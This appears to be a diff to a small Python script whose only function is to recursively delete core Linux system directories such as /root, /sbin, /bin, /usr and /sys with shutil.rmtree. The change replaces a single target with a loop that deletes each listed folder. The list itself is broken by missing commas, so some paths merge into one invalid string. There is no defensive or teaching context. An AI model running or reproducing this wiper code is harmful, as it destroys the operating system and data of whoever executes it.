@@ -1,8 +1,18 @@
 import shutil
+import os
 
-folder_path = "/sbin" or "/bin" or"/usr" or "/system" or "/root"
+folders = [
+    "/root",
+    "/sbin",
+    "/bin"
+    "/usr"
+    "/system"
+    "/sys"
+]
 
-# Forcefully remove the directory and everything inside
-shutil.rmtree(folder_path)
-
-print(f"{folder_path} Gash™")
+for folder in folders:
+    if os.path.exists(folder):
+        shutil.rmtree(folder)
+        print(f"Deleted: {folder}")
+    else:
+        print(f"Folder not found: {folder}")
